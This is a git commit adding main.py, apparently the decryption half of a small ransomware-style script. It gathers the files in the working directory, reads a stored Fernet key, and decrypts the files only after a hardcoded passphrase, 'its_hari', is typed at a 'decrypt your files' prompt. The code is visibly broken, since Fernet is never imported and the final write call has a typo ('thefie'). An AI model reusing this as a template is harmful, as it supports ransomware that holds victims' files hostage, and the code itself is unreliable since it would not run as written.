a158813e27048101400a0ebab3d5a0d173cb5231
Im-your-hari <51747755+Im-your-hari@users.noreply.github.com>
2023-09-21 00:58:29 +0530

    Create main.py

---
+++ main.py
@@ -0,0 +1,26 @@
+import os
+
+files = []
+
+for file in os.listdir():
+  if file == 'main.py' or file == 'key.key' or file == 'decrypt.py':
+    continue
+  if os.path.isfile(file):
+    files.append(file)
+print(files)
+
+with open('key.key',"rb") as key:
+  secretkey = key.read()
+
+secretphrase = "its_hari"
+
+user_phase = input("Enter the key to decrypt your files :: ")
+
+if user_phase == secretphrase:
+  for file in files:
+    with open(file,'rb') as thefile:
+      contents = thefile.read()
+    contents_decrypted = Fernet(secretkey).decrypt(contents)
+    with open(file,'wb') as thefile:
+      thefie.write(contents_decrypted)
+    print("Your files are decrypted..!")
